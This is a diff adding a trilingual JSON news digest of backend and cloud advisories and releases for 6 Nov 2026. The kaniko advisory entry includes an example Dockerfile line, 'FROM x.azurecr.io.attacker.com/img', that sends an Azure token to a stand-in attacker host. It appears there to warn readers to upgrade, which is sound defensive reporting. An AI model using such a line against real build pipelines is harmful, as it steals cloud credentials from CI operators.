@@ -1,0 +1,476 @@
+{
+  "title": {
+    "es": "Backend & Fullstack Daily — 6 Nov 2026",
+    "en": "Backend & Fullstack Daily — 6 Nov 2026",
+    "fr": "Backend & Fullstack Daily — 6 nov. 2026"
+  },
+  "description": {
+    "es": "kaniko filtra tokens de Azure a registries truchos, Keycloak con confusión de algoritmo JWT, GraphQL.js 17.1 con límites de parser y DynamoDB bulk put items en GA.",
+    "en": "kaniko leaks Azure tokens to lookalike registries, Keycloak JWT algorithm confusion, GraphQL.js 17.1 parser limits and DynamoDB bulk put items GA.",
+    "fr": "kaniko divulgue des jetons Azure à des registres usurpés, confusion d'algorithme JWT dans Keycloak, limites du parser dans GraphQL.js 17.1 et DynamoDB bulk put items en GA."
+  },
+  "pubDate": "2026-11-06",
+  "category": "backend-fullstack",
+  "highlights": [
+    {
+      "text": {
+        "es": "kaniko: token de Azure a hosts truchos (9.3)",
+        "en": "kaniko: Azure token sent to lookalike hosts (9.3)",
+        "fr": "kaniko : jeton Azure envoyé à des hôtes usurpés (9.3)"
+      },
+      "anchor": "kaniko-cve-2026-105769",
+      "icon": "lucide:shield"
+    },
+    {
+      "text": {
+        "es": "Keycloak: bypass de firma JWT (CVSS 8.1)",
+        "en": "Keycloak: JWT signature bypass (CVSS 8.1)",
+        "fr": "Keycloak : contournement de signature JWT (8.1)"
+      },
+      "anchor": "keycloak-cve-2026-11800",
+      "icon": "lucide:shield"
+    },
+    {
+      "text": {
+        "es": "GraphQL.js 17.1: límites anti-DoS en el parser",
+        "en": "GraphQL.js 17.1: anti-DoS parser limits",
+        "fr": "GraphQL.js 17.1 : limites anti-DoS du parser"
+      },
+      "anchor": "graphql-js-17-1",
+      "icon": "lucide:blocks"
+    },
+    {
+      "text": {
+        "es": "DynamoDB: bulk put items desde S3 en GA",
+        "en": "DynamoDB: bulk put items from S3 is GA",
+        "fr": "DynamoDB : bulk put items depuis S3 en GA"
+      },
+      "anchor": "dynamodb-bulk-put-items",
+      "icon": "lucide:database"
+    },
+    {
+      "text": {
+        "es": "Valkey 9.2 RC2: DELEX, Zstd y sync sin fork",
+        "en": "Valkey 9.2 RC2: DELEX, Zstd, forkless sync",
+        "fr": "Valkey 9.2 RC2 : DELEX, Zstd, sync sans fork"
+      },
+      "anchor": "valkey-9-2-rc2",
+      "icon": "simple-icons:redis"
+    },
+    {
+      "text": {
+        "es": "Kubernetes 1.38 entra en beta",
+        "en": "Kubernetes 1.38 enters beta",
+        "fr": "Kubernetes 1.38 passe en bêta"
+      },
+      "anchor": "kubernetes-1-38-beta",
+      "icon": "simple-icons:kubernetes"
+    }
+  ],
+  "tools": [
+    {
+      "id": "top-stories",
+      "name": "Top Stories",
+      "theme": "top-stories",
+      "icon_emoji": "🔥",
+      "anchor": "kaniko-cve-2026-105769",
+      "updates": [
+        {
+          "id": "kaniko-cve-2026-105769",
+          "tag": "security",
+          "date": "05 Nov 2026",
+          "title": {
+            "es": "kaniko < 1.25.20 manda tu token de Azure a cualquier registry que se parezca a ACR (CVE-2026-105769, CVSS 9.3)",
+            "en": "kaniko < 1.25.20 sends your Azure token to any registry that looks like ACR (CVE-2026-105769, CVSS 9.3)",
+            "fr": "kaniko < 1.25.20 envoie votre jeton Azure à tout registre qui ressemble à ACR (CVE-2026-105769, CVSS 9.3)"
+          },
+          "body_html": {
+            "es": "<p>El credential helper de ACR que kaniko trae embebido (<code>docker-credential-acr-env</code>) reconoce hosts de ACR con una regex <strong>sin anclar</strong>. Alcanza con un <code>FROM x.azurecr.io.attacker.com/img</code> para que el build le entregue un access token de Entra ID para Azure Resource Manager a un host del atacante: no hace falta ningún <code>RUN</code> ni push. Si buildeás Dockerfiles de terceros o de PRs en CI con identidad de Azure, actualizá YA al fork de Chainguard 1.25.20.</p>",
+            "en": "<p>The ACR credential helper bundled into kaniko (<code>docker-credential-acr-env</code>) detects ACR hosts with an <strong>unanchored</strong> regex. A single <code>FROM x.azurecr.io.attacker.com/img</code> makes the build hand an Entra ID access token for Azure Resource Manager to an attacker-controlled host, with no <code>RUN</code> and no push. If CI builds third-party or PR Dockerfiles under an Azure identity, upgrade the Chainguard fork to 1.25.20 now.</p>",
+            "fr": "<p>Le credential helper ACR intégré à kaniko (<code>docker-credential-acr-env</code>) reconnaît les hôtes ACR avec une regex <strong>non ancrée</strong>. Un simple <code>FROM x.azurecr.io.attacker.com/img</code> suffit pour livrer un jeton Entra ID pour Azure Resource Manager à un hôte de l'attaquant, sans <code>RUN</code> ni push. Si votre CI construit des Dockerfiles de tiers ou de PR avec une identité Azure, passez au fork Chainguard 1.25.20.</p>"
+          },
+          "source": {
+            "url": "https://github.com/advisories/GHSA-5q7h-w9jf-cx97",
+            "label": "github.com/advisories"
+          }
+        },
+        {
+          "id": "keycloak-cve-2026-11800",
+          "tag": "security",
+          "date": "03 Nov 2026",
+          "title": {
+            "es": "Keycloak 26.6.4: confusión de algoritmo JWT en el JWT Authorization Grant (CVE-2026-11800)",
+            "en": "Keycloak 26.6.4: JWT algorithm confusion in the JWT Authorization Grant (CVE-2026-11800)",
+            "fr": "Keycloak 26.6.4 : confusion d'algorithme JWT dans le JWT Authorization Grant (CVE-2026-11800)"
+          },
+          "body_html": {
+            "es": "<p>Con credenciales de cliente válidas, un atacante puede <strong>saltear la verificación de firma</strong> forjando una assertion y emitir access tokens a nombre de cualquier usuario federado del Identity Provider afectado (CVSS 8.1). Es el clásico bug de aceptar el <code>alg</code> que manda el token: si tenés el grant habilitado, actualizá a 26.6.4 y revisá qué clientes lo usan.</p>",
+            "en": "<p>An attacker holding valid client credentials can <strong>bypass signature verification</strong> by forging an assertion and mint access tokens as any federated user linked to the affected Identity Provider (CVSS 8.1). It is the classic trust-the-token's-<code>alg</code> bug: if the grant is enabled, upgrade to 26.6.4 and audit which clients use it.</p>",
+            "fr": "<p>Un attaquant disposant d'identifiants client valides peut <strong>contourner la vérification de signature</strong> en forgeant une assertion et émettre des jetons au nom de n'importe quel utilisateur fédéré de l'Identity Provider concerné (CVSS 8.1). Si le grant est activé, passez à 26.6.4 et auditez les clients qui l'utilisent.</p>"
+          },
+          "source": {
+            "url": "https://github.com/advisories/GHSA-j97h-3f8r-mrjr",
+            "label": "github.com/advisories"
+          }
+        },
+        {
+          "id": "graphql-js-17-1",
+          "tag": "release",
+          "date": "04 Nov 2026",
+          "title": {
+            "es": "GraphQL.js 17.1.0, 16.15.0 y 15.11.0 salen juntas: límites de parser y backports de performance",
+            "en": "GraphQL.js 17.1.0, 16.15.0 and 15.11.0 ship together: parser limits and performance backports",
+            "fr": "GraphQL.js 17.1.0, 16.15.0 et 15.11.0 sortent ensemble : limites du parser et backports de performance"
+          },
+          "body_html": {
+            "es": "<p>La 17.1 suma las opciones <code>maxComments</code> y <code>maxSourceLength</code> del parser y un límite configurable de anidamiento de listas: herramientas concretas para cortar queries abusivas antes de validar. También permite selection sets vacíos (cambio de spec) y arregla varias reglas de validación con fragments. La 16.15 backportea la tanda de optimizaciones de <code>OverlappingFieldsCanMerge</code> y reutilización de fragments, así que si seguís en v16 también ganás. Esto es un golazo para cualquier gateway expuesto.</p>",
+            "en": "<p>17.1 adds the <code>maxComments</code> and <code>maxSourceLength</code> parser options plus a configurable list-nesting limit: concrete tools to reject abusive queries before validation. It also allows empty selection sets (a spec change) and fixes several fragment-related validation rules. 16.15 backports the <code>OverlappingFieldsCanMerge</code> and fragment-reuse performance work, so v16 users benefit too.</p>",
+            "fr": "<p>La 17.1 ajoute les options <code>maxComments</code> et <code>maxSourceLength</code> du parser et une limite configurable d'imbrication des listes, pour rejeter les requêtes abusives avant validation. Elle autorise aussi les selection sets vides (changement de spec). La 16.15 rétroporte les optimisations de <code>OverlappingFieldsCanMerge</code> et de réutilisation des fragments.</p>"
+          },
+          "source": {
+            "url": "https://github.com/graphql/graphql-js/releases/tag/v17.1.0",
+            "label": "github.com/graphql/graphql-js"
+          }
+        },
+        {
+          "id": "dynamodb-bulk-put-items",
+          "tag": "ga",
+          "date": "05 Nov 2026",
+          "title": {
+            "es": "Amazon DynamoDB bulk put items en GA: cargá datos de S3 en tablas existentes sin pipeline propio",
+            "en": "Amazon DynamoDB bulk put items is GA: load S3 data into existing tables without a custom pipeline",
+            "fr": "Amazon DynamoDB bulk put items en GA : charger des données S3 dans des tables existantes sans pipeline maison"
+          },
+          "body_html": {
+            "es": "<p>Apuntás a la ubicación en S3 y DynamoDB escribe los ítems en una tabla <strong>existente</strong>, sin impactar el tráfico productivo ni obligarte a gestionar capacidad. Cada ítem admite su propia condition expression. Hasta ahora el import de S3 solo creaba tablas nuevas, así que esto mata un montón de Lambdas y Step Functions caseras de backfill.</p>",
+            "en": "<p>Point it at an S3 location and DynamoDB writes the items into an <strong>existing</strong> table without impacting production traffic or making you manage capacity. Each item supports its own condition expression. Until now S3 import only created new tables, so this retires a lot of home-grown backfill Lambdas and Step Functions.</p>",
+            "fr": "<p>Vous pointez un emplacement S3 et DynamoDB écrit les éléments dans une table <strong>existante</strong>, sans impacter le trafic de production ni gérer la capacité. Chaque élément accepte sa propre condition expression. L'import S3 ne créait jusqu'ici que de nouvelles tables.</p>"
+          },
+          "source": {
+            "url": "https://aws.amazon.com/about-aws/whats-new/2026/11/amazon-dynamodb-now-supports-bulk-put-items/",
+            "label": "aws.amazon.com"
+          }
+        }
+      ]
+    },
+    {
+      "id": "databases",
+      "name": "Databases & Data",
+      "theme": "databases",
+      "icon_emoji": "🗄️",
+      "anchor": "valkey-9-2-rc2",
+      "updates": [
+        {
+          "id": "valkey-9-2-rc2",
+          "tag": "beta",
+          "date": "04 Nov 2026",
+          "title": {
+            "es": "Valkey 9.2.0-rc2: DELEX condicional, RDB con Zstd y full sync sin fork",
+            "en": "Valkey 9.2.0-rc2: conditional DELEX, Zstd RDB and forkless full sync",
+            "fr": "Valkey 9.2.0-rc2 : DELEX conditionnel, RDB en Zstd et full sync sans fork"
+          },
+          "body_html": {
+            "es": "<p>Nuevo comando <code>DELEX</code> que borra un string solo si su valor coincide (<code>IFEQ</code>) o difiere (<code>IFNE</code>): el patrón de liberar un lock sin script Lua, ahora nativo. Suma Zstd como codec de compresión para RDB y replicación, y <strong>full sync a réplicas sin fork</strong> desde un snapshot en un thread de fondo, que baja los picos de memoria por copy-on-write. Para probar en staging, no en prod.</p>",
+            "en": "<p>The new <code>DELEX</code> command deletes a string only when its value matches (<code>IFEQ</code>) or differs (<code>IFNE</code>): the release-a-lock-without-Lua pattern, now native. It adds Zstd as a compression codec for RDB and replication, and <strong>forkless full sync to replicas</strong> from a background-thread snapshot, cutting copy-on-write memory spikes. Try it in staging, not production.</p>",
+            "fr": "<p>La nouvelle commande <code>DELEX</code> supprime une chaîne seulement si sa valeur correspond (<code>IFEQ</code>) ou diffère (<code>IFNE</code>) : libérer un verrou sans Lua, en natif. Ajout de Zstd pour la RDB et la réplication, et d'un <strong>full sync sans fork</strong> depuis un snapshot en thread de fond.</p>"
+          },
+          "source": {
+            "url": "https://github.com/valkey-io/valkey/releases/tag/9.2.0-rc2",
+            "label": "github.com/valkey-io/valkey"
+          }
+        },
+        {
+          "id": "bullmq-6-7-0",
+          "tag": "minor",
+          "date": "04 Nov 2026",
+          "title": {
+            "es": "BullMQ 6.7.0: contá los jobs delayed anteriores a un timestamp",
+            "en": "BullMQ 6.7.0: count delayed jobs before a timestamp",
+            "fr": "BullMQ 6.7.0 : compter les jobs différés avant un timestamp"
+          },
+          "body_html": {
+            "es": "<p>La cola ahora puede contar los jobs delayed que vencen antes de un timestamp dado. Chico, pero útil para métricas de backlog y alertas tipo «cuánto se va a disparar en los próximos 5 minutos» sin recorrer el sorted set a mano.</p>",
+            "en": "<p>Queues can now count delayed jobs due before a given timestamp. Small, but handy for backlog metrics and alerts like &quot;how much fires in the next 5 minutes&quot; without walking the sorted set yourself.</p>",
+            "fr": "<p>Les files peuvent désormais compter les jobs différés échus avant un timestamp donné, pratique pour les métriques de backlog et les alertes.</p>"
+          },
+          "source": {
+            "url": "https://github.com/taskforcesh/bullmq/releases/tag/v6.7.0",
+            "label": "github.com/taskforcesh/bullmq"
+          }
+        }
+      ]
+    },
+    {
+      "id": "cloud",
+      "name": "Cloud & DevOps",
+      "theme": "cloud",
+      "icon_emoji": "☁️",
+      "anchor": "kubernetes-1-38-beta",
+      "updates": [
+        {
+          "id": "kubernetes-1-38-beta",
+          "tag": "beta",
+          "date": "06 Nov 2026",
+          "title": {
+            "es": "Kubernetes v1.38.0-beta.0 publicada",
+            "en": "Kubernetes v1.38.0-beta.0 released",
+            "fr": "Kubernetes v1.38.0-beta.0 publiée"
+          },
+          "body_html": {
+            "es": "<p>El ciclo 1.38 entra en beta: a partir de acá el set de features queda prácticamente cerrado. Buen momento para correr tus manifests y operators contra la beta en un cluster efímero y leer el CHANGELOG-1.38 buscando deprecations antes de que te sorprendan en el upgrade.</p>",
+            "en": "<p>The 1.38 cycle enters beta, so the feature set is essentially frozen. Good time to run your manifests and operators against the beta in an ephemeral cluster and scan CHANGELOG-1.38 for deprecations before the upgrade surprises you.</p>",
+            "fr": "<p>Le cycle 1.38 passe en bêta : l'ensemble des fonctionnalités est quasiment figé. Bon moment pour tester vos manifests et operators sur un cluster éphémère et lire le CHANGELOG-1.38.</p>"
+          },
+          "source": {
+            "url": "https://github.com/kubernetes/kubernetes/releases/tag/v1.38.0-beta.0",
+            "label": "github.com/kubernetes/kubernetes"
+          }
+        },
+        {
+          "id": "ecs-gateway",
+          "tag": "notable",
+          "date": "04 Nov 2026",
+          "title": {
+            "es": "Amazon ECS Gateway: ingress a nivel de cuenta con routing por host",
+            "en": "Amazon ECS Gateway: account-level ingress with host-based routing",
+            "fr": "Amazon ECS Gateway : ingress au niveau du compte avec routage par hôte"
+          },
+          "body_html": {
+            "es": "<p>Plataforma define la red una sola vez y cada equipo suma su servicio con un connector; cada servicio recibe un hostname generado. Según InfoQ, ni el anuncio ni la doc cubren dominios custom todavía, así que ojo antes de migrar algo público.</p>",
+            "en": "<p>Platform teams define networking once and application teams opt services in with a connector; each service gets a generated hostname. Per InfoQ, neither the announcement nor the docs cover custom domains yet, so check that before migrating anything public-facing.</p>",
+            "fr": "<p>Les équipes plateforme définissent le réseau une fois, les équipes applicatives ajoutent leurs services via un connector avec un hostname généré. Selon InfoQ, les domaines personnalisés ne sont pas encore documentés.</p>"
+          },
+          "source": {
+            "url": "https://www.infoq.com/news/2026/11/introducing-amazon-ecs-gateway/",
+            "label": "infoq.com"
+          }
+        },
+        {
+          "id": "lambda-durable-quotas",
+          "tag": "notable",
+          "date": "05 Nov 2026",
+          "title": {
+            "es": "Lambda durable functions multiplica por 5–10 sus quotas por defecto",
+            "en": "Lambda durable functions raises default quotas 5–10x",
+            "fr": "Lambda durable functions multiplie par 5 à 10 ses quotas par défaut"
+          },
+          "body_html": {
+            "es": "<p>Ejecuciones durables en curso por cuenta: de 1 a <strong>5 millones</strong>; invocaciones para arrancarlas: de 300 a 3.000 rps; checkpoint y lectura de estado: de 1.000 a 10.000 rps. En us-east-1, us-west-2 y eu-west-1 es el doble. Si descartaste durable functions para workflows de alto volumen por los límites, revisalo.</p>",
+            "en": "<p>Running durable executions per account go from 1 to <strong>5 million</strong>; start invocations from 300 to 3,000 rps; checkpoint and state reads from 1,000 to 10,000 rps. us-east-1, us-west-2 and eu-west-1 get double. If quotas ruled durable functions out for high-volume workflows, revisit that.</p>",
+            "fr": "<p>Exécutions durables en cours par compte : de 1 à <strong>5 millions</strong> ; démarrages : de 300 à 3 000 rps ; checkpoints et lectures d'état : de 1 000 à 10 000 rps. Le double dans us-east-1, us-west-2 et eu-west-1.</p>"
+          },
+          "source": {
+            "url": "https://aws.amazon.com/about-aws/whats-new/2026/11/lambda-durable-functions-default-quotas/",
+            "label": "aws.amazon.com"
+          }
+        },
+        {
+          "id": "security-hub-sbom",
+          "tag": "notable",
+          "date": "06 Nov 2026",
+          "title": {
+            "es": "AWS Security Hub suma inventario SBOM de toda la organización",
+            "en": "AWS Security Hub adds an organization-wide SBOM inventory",
+            "fr": "AWS Security Hub ajoute un inventaire SBOM à l'échelle de l'organisation"
+          },
+          "body_html": {
+            "es": "<p>Arma el inventario a partir de los SBOM que Inspector ya genera para EC2, imágenes de ECR y funciones Lambda, sin configuración extra. Lista cada paquete con versión y cantidad de recursos donde está instalado: la próxima vez que salga un CVE en una lib de npm, sabés en minutos dónde corre.</p>",
+            "en": "<p>It builds the inventory from the SBOMs Inspector already generates for EC2, ECR images and Lambda functions, with no extra configuration. Each package is listed with its version and resource count, so the next npm CVE becomes a minutes-long where-does-this-run lookup.</p>",
+            "fr": "<p>L'inventaire est construit à partir des SBOM qu'Inspector génère déjà pour EC2, les images ECR et Lambda, sans configuration. Chaque paquet est listé avec sa version et son nombre de ressources.</p>"
+          },
+          "source": {
+            "url": "https://aws.amazon.com/about-aws/whats-new/2026/11/security-hub-sbom-inventory/",
+            "label": "aws.amazon.com"
+          }
+        },
+        {
+          "id": "gcp-api-gateway-streaming",
+          "tag": "beta",
+          "date": "05 Nov 2026",
+          "title": {
+            "es": "Google Cloud API Gateway suma streaming en preview pública",
+            "en": "Google Cloud API Gateway adds streaming in public preview",
+            "fr": "Google Cloud API Gateway ajoute le streaming en preview publique"
+          },
+          "body_html": {
+            "es": "<p>El gateway deja de ser solo request-response y acepta comunicación en tiempo real, pensado para respuestas de modelos en streaming, workflows de agentes de varios pasos y sesiones interactivas. Si hoy bypaseás el gateway para tus endpoints SSE, esto te deja volver a centralizar auth y quotas.</p>",
+            "en": "<p>The gateway moves beyond request-response to real-time communication, aimed at streaming model responses, multi-step agent workflows and interactive sessions. If you bypass the gateway for SSE endpoints today, this lets you centralize auth and quotas again.</p>",
+            "fr": "<p>La passerelle dépasse le modèle requête-réponse pour la communication temps réel : réponses de modèles en streaming, workflows d'agents et sessions interactives.</p>"
+          },
+          "source": {
+            "url": "https://www.infoq.com/news/2026/11/gcp-api-gateway-streaming/",
+            "label": "infoq.com"
+          }
+        },
+        {
+          "id": "wrangler-4-158",
+          "tag": "minor",
+          "date": "05 Nov 2026",
+          "title": {
+            "es": "Wrangler 4.158.0: Artifacts locales en dev y en Workers Vitest",
+            "en": "Wrangler 4.158.0: local Artifacts in dev and Workers Vitest",
+            "fr": "Wrangler 4.158.0 : Artifacts locaux en dev et dans Workers Vitest"
+          },
+          "body_html": {
+            "es": "<p>Con <code>remote: false</code> los bindings de Artifacts usan el simulador de Miniflare y repos locales persistentes. Ojo con el default: sin <code>remote</code>, <code>wrangler dev</code> sigue pegándole al recurso desplegado (con warning), mientras que Workers Vitest usa el simulador para no tocar repos reales por accidente.</p>",
+            "en": "<p>With <code>remote: false</code>, Artifacts bindings use the Miniflare simulator and persistent local repositories. Mind the defaults: without <code>remote</code>, <code>wrangler dev</code> still hits the deployed resource (with a warning), while Workers Vitest uses the simulator so tests never touch real repositories by accident.</p>",
+            "fr": "<p>Avec <code>remote: false</code>, les bindings Artifacts utilisent le simulateur Miniflare. Sans <code>remote</code>, <code>wrangler dev</code> cible toujours la ressource déployée, tandis que Workers Vitest utilise le simulateur.</p>"
+          },
+          "source": {
+            "url": "https://github.com/cloudflare/workers-sdk/releases/tag/wrangler%404.158.0",
+            "label": "github.com/cloudflare/workers-sdk"
+          }
+        }
+      ]
+    },
+    {
+      "id": "architecture",
+      "name": "Architecture & Best Practices",
+      "theme": "architecture",
+      "icon_emoji": "🏗️",
+      "anchor": "otel-js-3-1",
+      "updates": [
+        {
+          "id": "otel-js-3-1",
+          "tag": "release",
+          "date": "05 Nov 2026",
+          "title": {
+            "es": "OpenTelemetry JS 3.1.0: el peer de @opentelemetry/api sube a 1.10 y se depreca envDetector",
+            "en": "OpenTelemetry JS 3.1.0: @opentelemetry/api peer bumps to 1.10 and envDetector is deprecated",
+            "fr": "OpenTelemetry JS 3.1.0 : le peer @opentelemetry/api passe à 1.10 et envDetector est déprécié"
+          },
+          "body_html": {
+            "es": "<p>Los paquetes que dependen de <code>core</code>, <code>otlp-transformer</code> o <code>instrumentation</code> ahora exigen <code>@opentelemetry/api</code> ≥ 1.10: con la 1.9 nunca funcionaron, fallaban en runtime, y ahora npm te avisa en el install. <code>envDetector</code> se parte en <code>resourceAttributesEnvDetector</code> y <code>serviceNameEnvDetector</code>, y <code>service.instance.id</code> pasa a estable. Si ves un error de peer deps al actualizar, subí la API.</p>",
+            "en": "<p>Packages depending on <code>core</code>, <code>otlp-transformer</code> or <code>instrumentation</code> now require <code>@opentelemetry/api</code> ≥ 1.10: they never worked with 1.9 and failed at runtime, so npm now flags it at install time. <code>envDetector</code> splits into <code>resourceAttributesEnvDetector</code> and <code>serviceNameEnvDetector</code>, and <code>service.instance.id</code> becomes stable. Hit a peer-dependency error after upgrading? Bump the API package.</p>",
+            "fr": "<p>Les paquets qui dépendent de <code>core</code>, <code>otlp-transformer</code> ou <code>instrumentation</code> exigent désormais <code>@opentelemetry/api</code> ≥ 1.10 : ils échouaient déjà au runtime avec la 1.9. <code>envDetector</code> est scindé en deux détecteurs et <code>service.instance.id</code> devient stable.</p>"
+          },
+          "source": {
+            "url": "https://github.com/open-telemetry/opentelemetry-js/releases/tag/v3.1.0",
+            "label": "github.com/open-telemetry/opentelemetry-js"
+          }
+        },
+        {
+          "id": "cloudwatch-otel-api-keys",
+          "tag": "notable",
+          "date": "03 Nov 2026",
+          "title": {
+            "es": "CloudWatch acepta API keys (bearer tokens) para mandar trazas OTLP sin SigV4",
+            "en": "CloudWatch accepts API keys (bearer tokens) for OTLP traces without SigV4",
+            "fr": "CloudWatch accepte des clés API (bearer tokens) pour les traces OTLP sans SigV4"
+          },
+          "body_html": {
+            "es": "<p>Cualquier cliente OTLP/HTTP que pueda setear un header <code>Authorization</code> (el Collector o los exporters del SDK) puede mandar trazas al endpoint de X-Ray con un bearer token en lugar de firmar con SigV4. Destraba on-prem, otras nubes y pipelines de CI. Tradeoff: es un secreto estático, así que rotalo y scopealo como cualquier credencial de larga vida.</p>",
+            "en": "<p>Any OTLP/HTTP client that can set an <code>Authorization</code> header (the Collector or SDK exporters) can send traces to the X-Ray endpoint with a bearer token instead of SigV4 signing. That unblocks on-prem, other clouds and CI pipelines. Tradeoff: it is a static secret, so rotate and scope it like any long-lived credential.</p>",
+            "fr": "<p>Tout client OTLP/HTTP capable de définir un en-tête <code>Authorization</code> peut envoyer des traces à X-Ray avec un bearer token plutôt qu'en signant en SigV4. Contrepartie : c'est un secret statique à faire tourner.</p>"
+          },
+          "source": {
+            "url": "https://aws.amazon.com/about-aws/whats-new/2026/11/amazon-cloudwatch-api-keys-opentelemetry/",
+            "label": "aws.amazon.com"
+          }
+        },
+        {
+          "id": "docker-ai-agent-security",
+          "tag": "notable",
+          "date": "04 Nov 2026",
+          "title": {
+            "es": "Docker: cinco riesgos de seguridad de los agentes de IA y por qué el aislamiento le gana al modelo",
+            "en": "Docker: five security risks of AI agents and why isolation beats model improvements",
+            "fr": "Docker : cinq risques de sécurité des agents IA et pourquoi l'isolation prime sur le modèle"
+          },
+          "body_html": {
+            "es": "<p>La guía sostiene que la misma autonomía que hace útiles a los agentes (navegar, ejecutar código, llamar tools) vuelve insuficientes los controles clásicos de AppSec, y pone el aislamiento y la gobernanza como defensa principal. Lectura obligada si estás metiendo agentes en tu backend: pensalo como un tenant no confiable, con sandbox y permisos mínimos.</p>",
+            "en": "<p>The guide argues that the autonomy making agents useful (browsing, running code, calling tools) also makes conventional AppSec controls insufficient, and positions isolation and governance as the main defenses. Worth reading if agents are entering your backend: treat them as an untrusted tenant with a sandbox and least privilege.</p>",
+            "fr": "<p>Le guide soutient que l'autonomie des agents rend les contrôles AppSec classiques insuffisants et place l'isolation et la gouvernance comme défenses principales.</p>"
+          },
+          "source": {
+            "url": "https://www.infoq.com/news/2026/11/docker-ai-agent-security/",
+            "label": "infoq.com"
+          }
+        }
+      ]
+    },
+    {
+      "id": "fullstack",
+      "name": "Fullstack",
+      "theme": "fullstack",
+      "icon_emoji": "🔗",
+      "anchor": "payload-cve-2026-93363",
+      "updates": [
+        {
+          "id": "payload-cve-2026-93363",
+          "tag": "security",
+          "date": "04 Nov 2026",
+          "title": {
+            "es": "Payload: bypass de control de acceso en client uploads de @payloadcms/storage-vercel-blob (CVE-2026-93363)",
+            "en": "Payload: access-control bypass in @payloadcms/storage-vercel-blob client uploads (CVE-2026-93363)",
+            "fr": "Payload : contournement du contrôle d'accès des client uploads de @payloadcms/storage-vercel-blob (CVE-2026-93363)"
+          },
+          "body_html": {
+            "es": "<p>Desde la 3.25.0, el acceso a client uploads no respetaba siempre la configuración de acceso de la colección: cualquier usuario autenticado que llegara a la ruta podía subir. Afecta solo si tenés client uploads habilitados. Arreglado en <strong>3.90.0</strong> y 4.0.0-canary.34.</p>",
+            "en": "<p>Since 3.25.0, client-upload access did not consistently follow the collection's access configuration, so any authenticated user reaching the route could upload. Only setups with client uploads enabled are affected. Fixed in <strong>3.90.0</strong> and 4.0.0-canary.34.</p>",
+            "fr": "<p>Depuis la 3.25.0, l'accès aux client uploads ne respectait pas toujours la configuration d'accès de la collection. Seules les configurations avec client uploads sont concernées. Corrigé en <strong>3.90.0</strong> et 4.0.0-canary.34.</p>"
+          },
+          "source": {
+            "url": "https://github.com/advisories/GHSA-mc8m-rr6c-r5qr",
+            "label": "github.com/advisories"
+          }
+        },
+        {
+          "id": "sveltekit-2-70-4",
+          "tag": "patch",
+          "date": "05 Nov 2026",
+          "title": {
+            "es": "SvelteKit 2.70.4 lleva a la rama 2.x los fixes de seguridad de la 3.1.1",
+            "en": "SvelteKit 2.70.4 brings 3.1.1's security fixes to the 2.x line",
+            "fr": "SvelteKit 2.70.4 apporte à la branche 2.x les correctifs de sécurité de la 3.1.1"
+          },
+          "body_html": {
+            "es": "<p>Si todavía no migraste a Kit 3, este patch es para vos: bloquea la carga de código de otro origen para paths que empiezan con <code>//</code>, evita que los self-fetch del servidor sigan redirects, devuelve 400 en lugar de crashear cuando <code>reroute</code> recibe un pathname malformado y cierra un path traversal en el preview de páginas prerenderizadas en Windows. Actualizá también los adapters (node 5.5.8, vercel 6.3.5, cloudflare 7.2.10).</p>",
+            "en": "<p>Still on Kit 2? This patch is for you: it blocks loading code from another origin for pathnames starting with <code>//</code>, stops server self-fetch fallbacks from following redirects, returns 400 instead of crashing when <code>reroute</code> gets a malformed pathname, and closes a Windows path traversal when previewing prerendered pages. Update the adapters too (node 5.5.8, vercel 6.3.5, cloudflare 7.2.10).</p>",
+            "fr": "<p>Toujours sur Kit 2 ? Ce patch bloque le chargement de code d'une autre origine pour les chemins commençant par <code>//</code>, empêche les self-fetch serveur de suivre les redirections et corrige un path traversal sous Windows. Mettez aussi à jour les adapters.</p>"
+          },
+          "source": {
+            "url": "https://github.com/sveltejs/kit/releases/tag/%40sveltejs/kit%402.70.4",
+            "label": "github.com/sveltejs/kit"
+          }
+        },
+        {
+          "id": "pnpm-12-18",
+          "tag": "release",
+          "date": "05 Nov 2026",
+          "title": {
+            "es": "pnpm 12.18.0: platform variants en registries pnpr y aprobación de agent skills por skill",
+            "en": "pnpm 12.18.0: platform variants on pnpr registries and per-skill agent skill approval",
+            "fr": "pnpm 12.18.0 : variantes de plateforme sur les registres pnpr et approbation des agent skills par skill"
+          },
+          "body_html": {
+            "es": "<p><code>pnpm approve</code> ahora pregunta qué skills linkear cuando un paquete trae varias, y los links quedan con el nombre de la skill a secas (<code>.claude/skills/auth</code>) en vez del prefijo del paquete. Suma <code>pnpm store add</code> para installs offline desde tarballs bajados, y los installs repetidos ya no leen el <code>package.json</code> de proyectos del workspace que no cambiaron: monorepos grandes, a festejar.</p>",
+            "en": "<p><code>pnpm approve</code> now asks which skills to link when a package ships several, and links are named after the skill alone (<code>.claude/skills/auth</code>) instead of carrying a package prefix. It adds <code>pnpm store add</code> for offline installs from downloaded tarballs, and repeat installs no longer read the <code>package.json</code> of unchanged workspace projects, which large monorepos will feel.</p>",
+            "fr": "<p><code>pnpm approve</code> demande désormais quelles skills lier quand un paquet en fournit plusieurs. Ajout de <code>pnpm store add</code> pour les installations hors ligne, et les installations répétées ne relisent plus le <code>package.json</code> des projets inchangés.</p>"
+          },
+          "source": {
+            "url": "https://github.com/pnpm/pnpm/releases/tag/v12.18.0",
+            "label": "github.com/pnpm/pnpm"
+          }
+        }
+      ]
+    }
+  ],
+  "notable_trends": [
+    {
+      "es": "El supply chain de CI vuelve a ser el blanco: kaniko demuestra que un solo FROM malicioso alcanza para exfiltrar credenciales cloud, sin ejecutar nada.",
+      "en": "CI supply chain is the target again: kaniko shows that a single malicious FROM line is enough to exfiltrate cloud credentials without executing anything.",
+      "fr": "La supply chain CI redevient la cible : kaniko montre qu'une seule ligne FROM malveillante suffit à exfiltrer des identifiants cloud."
+    },
+    {
+      "es": "Los mantenedores siguen sosteniendo ramas viejas: GraphQL.js 15/16 y SvelteKit 2 recibieron backports el mismo día que sus versiones nuevas.",
+      "en": "Maintainers keep supporting older lines: GraphQL.js 15/16 and SvelteKit 2 got backports alongside their newer majors.",
+      "fr": "Les mainteneurs soutiennent les anciennes branches : GraphQL.js 15/16 et SvelteKit 2 ont reçu des backports."
+    },
+    {
+      "es": "Observabilidad sin fricción: CloudWatch acepta bearer tokens para OTLP y OpenTelemetry JS endurece sus peer deps para que los errores aparezcan en el install y no en producción.",
+      "en": "Lower-friction observability: CloudWatch accepts bearer tokens for OTLP, and OpenTelemetry JS tightens peer deps so errors surface at install time rather than in production.",
+      "fr": "Observabilité simplifiée : CloudWatch accepte les bearer tokens pour OTLP et OpenTelemetry JS durcit ses peer deps."
+    }
+  ]
+}
